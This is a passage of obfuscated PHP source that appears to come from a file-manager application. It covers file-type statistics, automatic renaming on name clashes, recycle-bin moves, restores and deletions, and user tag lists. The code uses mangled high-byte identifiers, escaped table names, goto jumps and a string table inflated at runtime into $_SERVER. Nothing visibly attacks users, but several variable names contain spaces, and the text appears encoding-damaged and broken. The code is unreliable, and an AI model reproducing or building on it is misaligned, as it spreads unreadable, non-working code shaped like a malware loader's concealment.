Model($ÎÖäàôì[431])->field($ÎÖäàôì[420])->where($ÀåÉÅñë)->select(); $˜»”öÉ¹ = array_to_keyvalue($˜»”öÉ¹, $ÎÖäàôì[12], $ÎÖäàôì[405]); $˜»”öÉ¹ = array_unique(array_filter($˜»”öÉ¹)); if ($˜»”öÉ¹) { $ÀåÉÅñë = array($ÎÖäàôì[420] => array($ÎÖäàôì[421], $˜»”öÉ¹)); $è½Ùíé += floatval($this->where($ÀåÉÅñë)->sum($ÎÖäàôì[90])); } $è½Ùíé = !$è½Ùíé || $è½Ùíé <= 0 ? 0 : $è½Ùíé; return $è½Ùíé; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($çÍûÇÙò) { return $this->fileTypeProfile($çÍûÇÙò, SourceModel::TYPE_USER); } public function groupFileTypeProfile($’ÍÅ¢†Ï) { return $this->fileTypeProfile($’ÍÅ¢†Ï, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Í  ñ¤¾, $Ó®›ñƒ¦) { $¼¤å§Ä” =& $_SERVER[ë¦»ºéÌ]; $Éœï£ù¬ = $¼¤å§Ä”[2097] . $Í  ñ¤¾ . $¼¤å§Ä”[11] . $Ó®›ñƒ¦; $Ûª¾ ¨° = Cache::get($Éœï£ù¬); if ($Ûª¾ ¨°) { return $Ûª¾ ¨°; } $Á™ëïªì = array($¼¤å§Ä”[579] => 0); if ($Í  ñ¤¾ != !1) { $Á™ëïªì[$¼¤å§Ä”[506]] = $Í  ñ¤¾; $Á™ëïªì[$¼¤å§Ä”[414]] = $Ó®›ñƒ¦; } $ÄÚòø‚À = array(); $ÄÚòø‚À[$¼¤å§Ä”[2098]] = array($¼¤å§Ä”[2099] => LNG($¼¤å§Ä”[2098]), $¼¤å§Ä”[2100] => $this->where($Á™ëïªì)->count(), $¼¤å§Ä”[581] => $this->where($Á™ëïªì)->sum($¼¤å§Ä”[90])); $ÇŠ»Ãà× = KodIO::fileTypeList(); foreach ($ÇŠ»Ãà× as $ñø«õš => $ÍŸÈªì) { $Á™ëïªì[$¼¤å§Ä”[415]] = $this->fileTypeWhere($ñø«õš); $ÄÚòø‚À[$ñø«õš] = array($¼¤å§Ä”[2099] => $ÍŸÈªì[$¼¤å§Ä”[42]], $¼¤å§Ä”[2100] => $this->where($Á™ëïªì)->count(), $¼¤å§Ä”[581] => $this->where($Á™ëïªì)->sum($¼¤å§Ä”[90])); } Cache::set($Éœï£ù¬, $ÄÚòø‚À, 1200); return $ÄÚòø‚À; } public function fileNameExist($‡¥ö£Ò, $‹†÷üı) { $ù®¯‹Ä© =& $_SERVER[ë¦»ºéÌ]; $ê¦®ëû = $this->where(array($ù®¯‹Ä©[500] => $‡¥ö£Ò, $ù®¯‹Ä©[42] => $‹†÷üı, $ù®¯‹Ä©[433] => 0))->find(); return is_array($ê¦®ëû) ? $ê¦®ëû[$ù®¯‹Ä©[405]] : !1; } public function childList($ÄÂéæãã) { $¥ŒÛóä =& $_SERVER[ë¦»ºéÌ]; $óî‚•¢á = $¥ŒÛóä[2074] . $ÄÂéæãã; if (isset(self::$cacheChildList[$óî‚•¢á])) { return self::$cacheChildList[$óî‚•¢á]; } $™¤¤– = array($¥ŒÛóä[500] => intval($ÄÂéæãã), $¥ŒÛóä[433] => 0); $ˆ³Ï‰ª = $this->where($™¤¤–)->select(); $ˆ³Ï‰ª = $ˆ³Ï‰ª ? $ˆ³Ï‰ª : array(); self::$cacheChildList[$óî‚•¢á] = $ˆ³Ï‰ª; foreach ($ˆ³Ï‰ª as $ò¥°ó›¦) { $óî‚•¢á = $¥ŒÛóä[460] . $ò¥°ó›¦[$¥ŒÛóä[405]]; self::$cacheSourceInfo[$óî‚•¢á] = $ò¥°ó›¦; } return $ˆ³Ï‰ª; } public function fileNameAuto($Á÷ãüò‹, $øâë«ƒÆ, $ö©¨öÂ = REPEAT_RENAME, $Ï‚Î¦Å­ = false) { $ˆ¾é–ã =& $_SERVER[ë¦»ºéÌ]; $‡şƒŠˆ” = array($ˆ¾é–ã[500] => $Á÷ãüò‹, $ˆ¾é–ã[433] => 0, $ˆ¾é–ã[42] => array($ˆ¾é–ã[389], $øâë«ƒÆ . $ˆ¾é–ã[390])); $ôéî—÷¸ = $this->field($ˆ¾é–ã[42])->where($‡şƒŠˆ”)->select(); $±éñŒ„’ = array_to_keyvalue($ôéî—÷¸, $ˆ¾é–ã[12], $ˆ¾é–ã[42]); return $this->fileNameAutoGet($±éñŒ„’, $øâë«ƒÆ, $ö©¨öÂ, $Ï‚Î¦Å­); } public function fileNameAutoGet($¬¼–±², $ê‘İ—¥è, $›±¶çê¯, $ç¸Ğ†˜ë) { $’İ¦”» =& $_SERVER[ë¦»ºéÌ]; if ($›±¶çê¯ == REPEAT_REPLACE || !$¬¼–±² || !in_array_not_case($ê‘İ—¥è, $¬¼–±²) || $ç¸Ğ†˜ë && $›±¶çê¯ != REPEAT_RENAME_FOLDER) { return $ê‘İ—¥è; } if ($›±¶çê¯ == REPEAT_SKIP) { return !1; } $¾Õ¡Ø¥Ó = $’İ¦”»[10] . get_path_ext($ê‘İ—¥è); $¾Õ¡Ø¥Ó = $¾Õ¡Ø¥Ó == $’İ¦”»[10] || $ç¸Ğ†˜ë ? $’İ¦”»[12] : $¾Õ¡Ø¥Ó; for ($½òÙ»‘µ = 1; $½òÙ»‘µ <= count($¬¼–±²) + 1; $½òÙ»‘µ++) { $•Ú­ø”Â = substr($ê‘İ—¥è, 0, strlen($ê‘İ—¥è) - strlen($¾Õ¡Ø¥Ó)); $şİÑ¨ä’ = $•Ú­ø”Â . "\x28{$½òÙ»‘µ}\x29{$¾Õ¡Ø¥Ó}"; if (!in_array_not_case($şİÑ¨ä’, $¬¼–±²)) { return $şİÑ¨ä’; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\143\x65\x5f\x72\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\155\145", "\x74\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\156\x63\x74\x69\157\x6e")); public function listData($ö–‚éŠÀ = false) { $ÌâŸæû‘ =& $_SERVER[ë¦»ºéÌ]; $ö–‚éŠÀ = $ö–‚éŠÀ ? $ö–‚éŠÀ : USER_ID; $“ŒµÓ÷¤ = $this->where(array($ÌâŸæû‘[1623] => $ö–‚éŠÀ))->select(); return array_to_keyvalue($“ŒµÓ÷¤, $ÌâŸæû‘[12], $ÌâŸæû‘[405]); } public function moveToRecycle($Èõ”‡ØÅ) { $¬’çÙ© =& $_SERVER[ë¦»ºéÌ]; $ÎÀ·«ƒ· = Model($¬’çÙ©[1305]); $¹Éáş¶ = $ÎÀ·«ƒ·->sourceInfo($Èõ”‡ØÅ); if (!$¹Éáş¶ || $¹Éáş¶[$¬’çÙ©[433]] == $¬’çÙ©[99]) { return; } $óŸÓ’Ôá = array($¬’çÙ©[420] => $Èõ”‡ØÅ, $¬’çÙ©[1623] => USER_ID, $¬’çÙ©[582] => $¹Éáş¶[$¬’çÙ©[414]], $¬’çÙ©[583] => $¹Éáş¶[$¬’çÙ©[506]], $¬’çÙ©[586] => $¹Éáş¶[$¬’çÙ©[523]]); $this->add($óŸÓ’Ôá); $this->recycleMove($Èõ”‡ØÅ, 1); if ($¹Éáş¶[$¬’çÙ©[413]] == $¬’çÙ©[99]) { $’µÆöïÉ = array($¬’çÙ©[586] => array($¬’çÙ©[546], $¹Éáş¶[$¬’çÙ©[523]] . $Èõ”‡ØÅ . $¬’çÙ©[547])); $ÎÀ·«ƒ·->where($’µÆöïÉ)->setField($¬’çÙ©[433], 1); } } public function clear() { $this->remove(!1); } public function remove($ìé¼²›ñ = false, $ôßê·™ü = false) { $…ˆ´§– =& $_SERVER[ë¦»ºéÌ]; $ôßê·™ü = $ôßê·™ü ? $ôßê·™ü : USER_ID; $¯ÏÕ’³Ÿ = Model($…ˆ´§–[1305]); $¦–„ıŞô = $this->listData($ôßê·™ü); $ìé¼²›ñ = $ìé¼²›ñ === !1 ? !1 : $ìé¼²›ñ; $úŠ¿§“ = array(); foreach ($¦–„ıŞô as $Åœ»¢œì) { if ($ìé¼²›ñ != !1 && !in_array($Åœ»¢œì, $ìé¼²›ñ)) { continue; } $€¡ÉÀ­æ = $¯ÏÕ’³Ÿ->sourceInfo($Åœ»¢œì); $¯ÏÕ’³Ÿ->remove($Åœ»¢œì, !1); $–½Ê¯“Ğ = $€¡ÉÀ­æ[$…ˆ´§–[414]] . $…ˆ´§–[11] . $€¡ÉÀ­æ[$…ˆ´§–[506]]; $úŠ¿§“[$–½Ê¯“Ğ] = array($…ˆ´§–[582] => $€¡ÉÀ­æ[$…ˆ´§–[414]], $…ˆ´§–[506] => $€¡ÉÀ­æ[$…ˆ´§–[506]]); $this->where(array($…ˆ´§–[405] => $Åœ»¢œì))->delete(); } foreach ($úŠ¿§“ as $ÉïïÇ) { $¯ÏÕ’³Ÿ->targetSpaceUpdate($ÉïïÇ[$…ˆ´§–[414]], $ÉïïÇ[$…ˆ´§–[506]]); } } public function restore($íŞí°Ğ‡ = false) { $Øˆ¨§Ÿş = $this->listData(); $this->_restoreSource($Øˆ¨§Ÿş, $íŞí°Ğ‡); } public function removeUserAll($Óªõõ®Ğ) { $this->remove(!1, $Óªõõ®Ğ); } private function _restoreSource($¾¦†ÖÀŒ, $ÓÑñÍù) { $¶ñäÀñë =& $_SERVER[ë¦»ºéÌ]; $óîœÁ® = Model($¶ñäÀñë[1305]); $ÓÑñÍù = $ÓÑñÍù == !1 ? !1 : $ÓÑñÍù; if (!$¾¦†ÖÀŒ) { return !0; } $­„½«ãİ = array(); foreach ($¾¦†ÖÀŒ as $¬øÙµç³) { if ($ÓÑñÍù != !1 && !in_array($¬øÙµç³, $ÓÑñÍù)) { continue; } $óèÌÈ”¾ = $óîœÁ®->sourceInfo($¬øÙµç³); $Ì«„ÙË¢ = $óîœÁ®->sourceInfo($óèÌÈ”¾[$¶ñäÀñë[500]]); if ($Ì«„ÙË¢[$¶ñäÀñë[433]] == $¶ñäÀñë[99]) { continue; } $óîœÁ®->lockMoveStart($¬øÙµç³); $this->recycleMove($¬øÙµç³, 0); if ($óèÌÈ”¾[$¶ñäÀñë[413]] == $¶ñäÀñë[99]) { $ñšÃ¦Åõ = array($¶ñäÀñë[586] => array($¶ñäÀñë[546], $óèÌÈ”¾[$¶ñäÀñë[523]] . $¬øÙµç³ . $¶ñäÀñë[547])); $óîœÁ®->where($ñšÃ¦Åõ)->setField($¶ñäÀñë[433], 0); $this->restoreFolderChildren($¬øÙµç³, $¾¦†ÖÀŒ); } $this->where(array($¶ñäÀñë[405] => $¬øÙµç³))->delete(); $óîœÁ®->folderSizeReset($óèÌÈ”¾[$¶ñäÀñë[500]]); $­„½«ãİ[] = $óèÌÈ”¾[$¶ñäÀñë[500]]; if ($óèÌÈ”¾[$¶ñäÀñë[413]] == $¶ñäÀñë[99]) { $­„½«ãİ[] = $¬øÙµç³; } $óîœÁ®->lockMoveEnd($¬øÙµç³); } $óîœÁ®->updateModifyTime($­„½«ãİ); } private function restoreFolderChildren($‚©¯Ó°ø, $ºªÀ’õÎ) { $’§Š¾ü– =& $_SERVER[ë¦»ºéÌ]; $şõÚºê  = Model($’§Š¾ü–[1305]); $Í·ö‰„Ğ = array($’§Š¾ü–[405] => array($’§Š¾ü–[7], array())); foreach ($ºªÀ’õÎ as $¯éœÂ©‘) { if ($¯éœÂ©‘ == $‚©¯Ó°ø) { continue; } if (!$şõÚºê ->isParentOf($‚©¯Ó°ø, $¯éœÂ©‘)) { continue; } $¥ÙÊ¥£ = $şõÚºê ->sourceInfo($¯éœÂ©‘); if ($¥ÙÊ¥£[$’§Š¾ü–[413]] == $’§Š¾ü–[99]) { $Í·ö‰„Ğ[] = array($’§Š¾ü–[586] => array($’§Š¾ü–[546], $¥ÙÊ¥£[$’§Š¾ü–[523]] . $¯éœÂ©‘ . $’§Š¾ü–[547])); } else { $Í·ö‰„Ğ[$’§Š¾ü–[405]][1][] = $¯éœÂ©‘; } } if (!$Í·ö‰„Ğ[$’§Š¾ü–[405]][1]) { unset($Í·ö‰„Ğ[$’§Š¾ü–[405]]); } if (!$Í·ö‰„Ğ) { return; } $Í·ö‰„Ğ[$’§Š¾ü–[405]][1] = array_unique($Í·ö‰„Ğ[$’§Š¾ü–[405]][1]); $Í·ö‰„Ğ[$’§Š¾ü–[980]] = $’§Š¾ü–[1895]; $şõÚºê ->where($Í·ö‰„Ğ)->setField($’§Š¾ü–[433], 1); } private function recycleMove($ğäúÒ¦Æ, $ÎÕÌ¡ã = 1) { $Æ¢¥˜ä =& $_SERVER[ë¦»ºéÌ]; $­ïûÁõò = Model($Æ¢¥˜ä[1305]); $ŒüíØ± = Model($Æ¢¥˜ä[2101]); $şüèù˜¡ = array($Æ¢¥˜ä[405] => $ğäúÒ¦Æ); if ($ÎÕÌ¡ã) { $­ïûÁõò->where($şüèù˜¡)->setField($Æ¢¥˜ä[433], 1); $ŒüíØ±->eventRecycle($ğäúÒ¦Æ, $Æ¢¥˜ä[2102]); } else { $ÛåÈæ™ã = $­ïûÁõò->where($şüèù˜¡)->find(); $“Ù§¦ôá = $ÛåÈæ™ã[$Æ¢¥˜ä[413]] == $Æ¢¥˜ä[99]; $©“¶£Îö = $­ïûÁõò->fileNameAuto($ÛåÈæ™ã[$Æ¢¥˜ä[500]], $ÛåÈæ™ã[$Æ¢¥˜ä[42]], REPEAT_RENAME_FOLDER, $“Ù§¦ôá); if ($©“¶£Îö != $ÛåÈæ™ã[$Æ¢¥˜ä[42]]) { $­ïûÁõò->rename($ğäúÒ¦Æ, $©“¶£Îö); } $­ïûÁõò->where($şüèù˜¡)->setField($Æ¢¥˜ä[433], 0); $ŒüíØ±->eventRecycle($ğäúÒ¦Æ, $Æ¢¥˜ä[2103]); } } } goto bŞäöíèºò; cë‡öÀÖ†: if (!$erjzalsngf) { return; } $_SERVER[·´Å÷Ä] = explode($_SERVER[ë¦»ºéÌ][609], gzinflate(substr($_SERVER[ë¦»ºéÌ][610], 10, -8))); $cntvihqprs = $_SERVER[ë¦»ºéÌ][611]; goto B½óèíÌ¹; c™­¤ó£¦Î: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($•¬ÍÎ°Ü) { $Ã££ÎÜ =& $_SERVER[ë¦»ºéÌ]; return array($Ã££ÎÜ[1908] => array(USER_ID, $Ã££ÎÜ[1909])); } protected function listData() { $êñÆ„…Ï =& $_SERVER[ë¦»ºéÌ]; $œŸõëú— = array($êñÆ„…Ï[1623] => USER_ID, $êñÆ„…Ï[485] => array($êñÆ„…Ï[1912], 0)); $ô©®ãÜ = $êñÆ„…Ï[1914]; $×³àÒ®µ = $this->field($ô©®ãÜ)->where($œŸõëú—)->order($êñÆ„…Ï[1915])->select(); return $×³àÒ®µ ? $×³àÒ®µ : array(); } protected function listByTag($Ñ¡¶ˆÈö) { } protected function addToTag($ÇÜÚÍ¨, $èÕ•…¨) { $¹ã¨î· =& $_SERVER[ë¦»ºéÌ]; if (!Model($¹ã¨î·[2049])->listData($èÕ•…¨) || !Model($¹ã¨î·[809])->pathInfo($ÇÜÚÍ¨)) { return !1; } $éŞ²ƒ·ö = array($¹ã¨î·[1623] => USER_ID, $¹ã¨î·[485] => $èÕ•…¨, $¹ã¨î·[424] => $ÇÜÚÍ¨, $¹ã¨î·[425] => $¹ã¨î·[419], $¹ã¨î·[423] => $¹ã¨î·[12], $¹ã¨î·[1804] => 0); if ($this->where($éŞ²ƒ·ö)->find()) { return !1; } return $this->add($éŞ²ƒ·ö); } protected function removeFromTag($¶«¤—™, $™ñ¸ô¸Ÿ) { $¦²ß÷”Å =& $_SERVER[ë¦»ºéÌ]; if (!Model($¦²ß÷”Å[2049])->listData($™ñ¸ô¸Ÿ)) { return !1; } if (is_array($¶«¤—™)) { $¶«¤—™ = array($¦²ß÷”Å[7], $¶«¤—™); } $Ğ…ºçİ´ = array($¦²ß÷”Å[1623] => USER_ID, $¦²ß÷”Å[485] => $™ñ¸ô¸Ÿ, $¦²ß÷”Å[425] => $¦²ß÷”Å[419], $¦²ß÷”Å[424] => $¶«¤—™); return $this->where($Ğ…ºçİ´)->delete(); } protected function removeByTag($©¡Ôİ©) { $•Ú§ø©ø =& $_SERVER[ë¦»ºéÌ]; if (!$©¡Ôİ©) { return !1; } $Ô¬÷½ ² = array($•Ú§ø©ø[1623] => USER_ID, $•Ú§ø©ø[485] => $©¡Ôİ©); return $this->where($Ô¬÷½ ²)->delete(); } protected function removeBySource($êìü–÷®) { $µÉÌ—¢³ =& $_SERVER[ë¦»ºéÌ]; if (is_array($êìü–÷®)) { $êìü–÷® = array($µÉÌ—¢³[7], $êìü–÷®); } $›×´Şù = array($µÉÌ—¢³[1623] => USER_ID, $µÉÌ—¢³[424] => $êìü–÷®, $µÉÌ—¢³[485] => array($µÉÌ—¢³[994], 0)); return $this->where($›×´Şù)->delete(); } }